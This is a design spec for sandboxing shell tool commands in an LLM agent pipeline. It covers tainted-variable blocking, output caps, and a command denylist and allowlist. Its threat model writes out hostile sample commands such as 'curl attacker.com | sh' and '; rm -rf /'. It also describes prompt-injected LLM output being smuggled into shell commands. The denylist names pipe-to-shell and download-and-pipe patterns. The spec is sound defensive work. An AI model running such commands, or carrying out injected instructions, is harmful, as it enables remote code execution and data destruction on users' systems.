# Tool Command Sandboxing — Design Spec

**Date:** 2026-04-03
**Issue:** #16 (P0 critical, security)
**Scope:** Three defense-in-depth layers for tool_command execution safety

---

## Threat Model

### Threat 1: LLM output injection via variable expansion

`ExpandVariables` interpolates `${ctx.last_response}` (LLM output) into tool_command strings. If the LLM output contains shell metacharacters (`; rm -rf /`, `$(curl attacker.com)`), the resulting command is passed to `sh -c` unsanitized.

**Vector:** Prompt injection or hallucinated output from any upstream agent node.

### Threat 2: Malicious .dip files

.dip files are typically team-authored but can be distributed (email, download, shared repos). A malicious .dip file can contain `tool_command: "curl attacker.com | sh"` directly.

**Vector:** Social engineering — user runs an untrusted .dip file.

### Threat 3: Unbounded output capture

Tool commands can produce unlimited stdout/stderr. A command like `yes` or `cat /dev/urandom | base64` fills memory until OOM.

**Vector:** Malicious .dip file or buggy command in a trusted pipeline.

---

## Layer 1: Tainted Variable Blocking

### Problem

`ExpandVariables` is called on tool_command with `pctx` containing LLM output. The function expands `${ctx.last_response}`, `${ctx.tool_stdout}`, etc. into shell commands.

### Fix

Add a `taintedKeys` set to `ExpandVariables`. When called in tool_command mode, refuse to expand keys whose values originate from LLM or external input.

**Tainted keys (hardcoded, not configurable):**
- `last_response`
- `human_response`
- `tool_stdout`
- `tool_stderr`
- `interview_questions`
- `interview_answers`
- Any key matching `response.*` prefix (per-node response keys from PR #50)

**Behavior:** When a tainted key is referenced in a tool_command (`${ctx.last_response}`), expansion returns an error with an actionable message:

```
error: tool_command for node "verify" references tainted variable "${ctx.last_response}" — 
LLM output cannot be interpolated into shell commands. Instead, write the output to a file 
in a prior tool node and read it in your command: cat "$ARTIFACT_DIR/output.txt" | jq ...
```

**Implementation:** Add a new function `ExpandVariablesForCommand` that wraps `ExpandVariables` with tainted-key checking. This avoids changing the `ExpandVariables` signature (which has 15+ callers). The tool handler calls `ExpandVariablesForCommand` instead of `ExpandVariables`.

```go
// ExpandVariablesForCommand expands variables in a tool_command string,
// blocking tainted keys that contain LLM or external input.
func ExpandVariablesForCommand(command string, ctx *PipelineContext, params, graphAttrs map[string]string) (string, error)
```

Internally, it scans for `${ctx.<key>}` patterns, checks each key against the tainted set before calling through to the normal expansion logic. Returns an error if any tainted key is referenced.

**Non-tainted keys (safe to expand in tool_command):**
- `outcome` — simple string (success/fail/retry)
- `preferred_label` — edge label string
- `graph.goal` — pipeline-level goal text (from .dip author, not LLM)
- `graph.*` — all graph-level attrs (author-controlled)
- `params.*` — subgraph params (author-controlled)

### Safe pattern (documented in CLAUDE.md)

```bash
# DON'T: ${ctx.last_response} in tool_command
tool_command: echo ${ctx.last_response} | process

# DO: Write output to file in prior node, read in tool
tool_command: cat .ai/agent_output.json | jq '.result'
```

---

## Layer 2: Output Size Limits

### Problem

`ExecCommand` captures stdout/stderr into unbounded `bytes.Buffer`. A runaway command can OOM the process.

### Fix

Add a `LimitedWriter` wrapper that caps bytes written. Default: **64KB** per stream (stdout and stderr independently). Configurable via `output_limit` node attr.

**Implementation in `agent/exec/local.go`:**

```go
type limitedBuffer struct {
    buf   bytes.Buffer
    limit int
}

func (lb *limitedBuffer) Write(p []byte) (int, error) {
    remaining := lb.limit - lb.buf.Len()
    if remaining <= 0 {
        return len(p), nil // silently discard excess
    }
    if len(p) > remaining {
        p = p[:remaining]
    }
    return lb.buf.Write(p)
}
```

When output is truncated, append a marker: `\n...(output truncated at 64KB)`.

**Node attr:** `output_limit` — parsed as byte count (e.g., `"65536"`, `"128KB"`). Default: 64KB. Applied in tool handler before calling `ExecCommand`.

**Default constant:** `DefaultOutputLimit = 64 * 1024` in `pipeline/handlers/tool.go`.

---

## Layer 3: Command Allowlist / Denylist

### Problem

Untrusted .dip files can specify arbitrary tool_command values. No mechanism restricts what commands can run.

### Fix

Two complementary mechanisms:

### Denylist (always active)

A default denylist of obviously dangerous command patterns, checked on every tool_command execution. The denylist is hardcoded and not configurable (defense-in-depth — can't be turned off).

**Default denied patterns:**
- `eval *` — arbitrary code execution
- `exec *` — replace process
- `source *` — execute file in current shell
- `. *` (dot-space) — same as source
- `* | sh`, `* | bash`, `* | zsh` — pipe to shell
- `* | sh -`, `* | bash -` — pipe to shell (dash variant)
- `curl * | *`, `wget * | *` — download and pipe (common attack vector)

**Matching:** Check the expanded command string against patterns. `*` matches any characters. Check is case-insensitive. Patterns are matched against the full command after variable expansion.

**Behavior:** Denied commands return an error:

```
error: tool_command for node "setup" matches denied pattern "curl * | *" — 
this command pattern is blocked for security. If this is intentional, 
add it to tool_commands_allow in your pipeline or use --tool-allowlist.
```

### Allowlist (opt-in)

When configured, ONLY allowed commands can run. Anything not matching the allowlist is rejected (even if not on the denylist).

**Configuration:**
- Graph attr: `tool_commands_allow` — comma-separated patterns
- CLI flag: `--tool-allowlist` — comma-separated patterns (overrides graph attr)

**Pattern matching:** Same glob-style as denylist. `*` matches any characters.

```
# In .dip file:
defaults
  tool_commands_allow: make *, go test *, git *, cat *, grep *

# Or CLI:
tracker run pipeline.dip --tool-allowlist="make *,go test *,git *"
```

**Behavior:** When allowlist is set and command doesn't match:

```
error: tool_command "npm install malware" for node "setup" is not in the allowlist. 
Allowed patterns: make *, go test *, git *
```

### Evaluation order

1. Check denylist (always) — reject if matched
2. If allowlist is configured, check allowlist — reject if not matched
3. Execute command

### Override: denylist bypass via allowlist

If a command matches the denylist but also matches the allowlist, the allowlist wins. This lets trusted pipelines explicitly allow patterns like `curl` when they know what they're doing. The allowlist is an explicit trust decision.

---

## Files Changed

| File | Changes |
|------|---------|
| `pipeline/expand.go` | Add `ExpandVariablesForCommand` wrapper with tainted-key blocking |
| `pipeline/expand_test.go` | Test tainted key blocking |
| `pipeline/handlers/tool.go` | Pass tainted keys set, parse output_limit, check allow/denylist |
| `pipeline/handlers/tool_test.go` | Tests for all three layers |
| `pipeline/handlers/tool_safety.go` | New file — denylist patterns, allowlist matching, command checking |
| `pipeline/handlers/tool_safety_test.go` | Tests for pattern matching |
| `agent/exec/local.go` | Add `limitedBuffer`, plumb output limit |
| `agent/exec/env.go` | Add `OutputLimit` to `ExecCommand` or a new method |
| `agent/exec/local_test.go` | Test output limiting |
| `cmd/tracker/run.go` | `--tool-allowlist` CLI flag |
| `CLAUDE.md` | Update "Tool node safety" section |

## Non-Goals

- Container/seccomp sandboxing (platform-specific, overkill for now)
- Automatic shell quoting of expanded variables (fragile)
- Network isolation
- Per-command resource limits (CPU, memory, disk)
- Making the tainted key set configurable (security should be opinionated)
